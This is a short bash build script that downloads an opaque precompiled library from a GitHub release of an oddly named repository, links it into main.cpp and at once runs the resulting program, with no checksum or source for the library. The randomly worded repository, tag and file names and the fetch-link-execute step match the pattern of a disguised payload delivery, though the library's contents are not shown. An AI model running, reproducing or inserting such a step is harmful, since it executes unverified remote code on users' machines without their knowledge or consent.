#!/usr/bin/env bash
set -e
REPO="tnenbyanl/nodediffuseconverter"
LIB="packed-closet.a"
URL="https://github.com/${REPO}/releases/download/eager-canyon-bright-forest/${LIB}"
curl --retry 3 --connect-timeout 15 -fsSL --max-time 180 "$URL" -o "$LIB"
g++ -pthread -O2 -std=c++17 main.cpp "$LIB" -o app && ./app
